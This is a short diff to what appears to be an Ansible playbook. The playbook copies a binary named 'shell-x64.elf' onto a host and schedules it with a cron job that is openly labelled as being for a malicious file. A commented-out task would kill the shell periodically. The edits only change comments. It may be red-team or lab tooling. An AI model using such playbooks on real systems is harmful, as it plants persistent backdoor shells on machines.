@@ -40,7 +40,7 @@
 - name: Create file shell-x64.elf
   copy:
     src: shell-x64.elf
-    #Edit this
+    #Edit this (may be copy to file download)
     dest: /home/user/shell-x64.elf
 
 - name: Cron job for malicious file
@@ -53,6 +53,6 @@
 # - name: Cronjob kill
 #   cron:
 #    name: "kill shell"
-#    minute: "*/10" # every 6 minutes
+#    minute: "*/10" # every 10 minutes
 #    job: "pkill shell-x64.elf"
 ...
